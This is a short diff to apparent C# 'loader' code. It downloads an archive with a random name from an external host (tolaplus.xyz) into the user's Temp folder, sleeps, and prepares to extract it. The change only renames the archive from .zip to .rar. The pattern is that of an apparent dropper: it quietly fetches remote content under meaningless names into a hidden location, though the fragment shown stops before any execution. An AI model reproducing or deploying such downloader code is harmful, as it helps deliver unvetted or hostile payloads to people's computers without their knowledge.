@@ -31,11 +31,11 @@ namespace Loader.Products
 
             try
             {
-                string download = (Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Temp\\GqTsAcXgU.zip");
+                string download = (Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Temp\\XaQeWsAwTaDs.rar");
                 string extractzip = (Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Temp\\1");
 
                 WebClient webClient = new WebClient();
-                webClient.DownloadFileAsync(new Uri("https://tolaplus.xyz/1/GqTsAcXgU.zip"), @download);
+                webClient.DownloadFileAsync(new Uri("https://tolaplus.xyz/1/XaQeWsAwTaDs.rar"), @download);
 
                 Thread.Sleep(10000);
                 string zipPatch = download;
